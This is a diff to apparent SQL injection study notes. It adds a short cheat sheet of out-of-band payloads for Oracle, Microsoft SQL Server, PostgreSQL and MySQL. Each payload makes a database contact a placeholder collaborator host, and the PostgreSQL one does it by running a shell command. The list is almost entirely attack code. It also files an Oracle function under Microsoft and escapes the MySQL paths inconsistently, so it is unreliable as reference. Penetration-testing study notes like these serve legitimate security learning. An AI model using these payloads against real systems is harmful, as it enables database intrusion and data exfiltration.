@@ -7,3 +7,16 @@ In some situations, an attacker can escalate a SQL injection attack to compromis
 ## Cheatsheet
 
 https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+### Out-of-band interactions
+
+- Oracle
+  - `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
+- Microsoft
+  - `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`
+  - `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`
+- PostgreSQL
+  - `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`
+- MySQL
+  - `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`
+  - `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`
